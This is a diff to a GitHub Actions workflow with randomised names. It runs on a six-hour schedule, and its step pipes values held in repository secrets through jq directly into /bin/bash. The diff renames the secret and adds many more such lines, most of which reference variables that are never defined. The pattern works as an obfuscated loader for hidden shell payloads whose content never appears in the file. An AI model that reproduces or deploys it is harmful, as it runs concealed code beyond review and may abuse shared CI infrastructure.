@@ -1,22 +1,30 @@
 name: zhuzhuanyun3987
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 4/6 * * *'
+    - cron: '23 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhuzhuanyun3987
         env:
-          s0: ${{ secrets.s0 }}
+          vsm102: ${{ secrets.vsm102 }}
         run: |
-          echo $s0 | jq -r .gtmul2211 | /bin/bash
-          echo $riv332 | jq -r .x2398 | /bin/bash
-          echo $qh86 | jq -r .fgjvn42 | /bin/bash
-          echo $u1 | jq -r .fkx71 | /bin/bash
-          echo $hikp6059 | jq -r .u5738 | /bin/bash
-          echo $fzkka1677 | jq -r .npmqw45 | /bin/bash
+          echo $vsm102 | jq -r .wtwvn9 | /bin/bash
+          echo $vknwc1 | jq -r .yz734 | /bin/bash
+          echo $jqf1 | jq -r .vsspt91 | /bin/bash
+          echo $bkrwv240 | jq -r .urzqx688 | /bin/bash
+          echo $rm55 | jq -r .xh6588 | /bin/bash
+          echo $b28599 | jq -r .o08 | /bin/bash
+          echo $ijcs33 | jq -r .wxpv77049 | /bin/bash
+          echo $wd7 | jq -r .orv2 | /bin/bash
+          echo $wuufp9171 | jq -r .uk698 | /bin/bash
+          echo $vzpxk36 | jq -r .nhw92 | /bin/bash
+          echo $qk8 | jq -r .rixua9 | /bin/bash
+          echo $hzav15 | jq -r .mbc6336 | /bin/bash
+          echo $xl179 | jq -r .vnn305 | /bin/bash
+          echo $xux3159 | jq -r .kvdnn5837 | /bin/bash
 
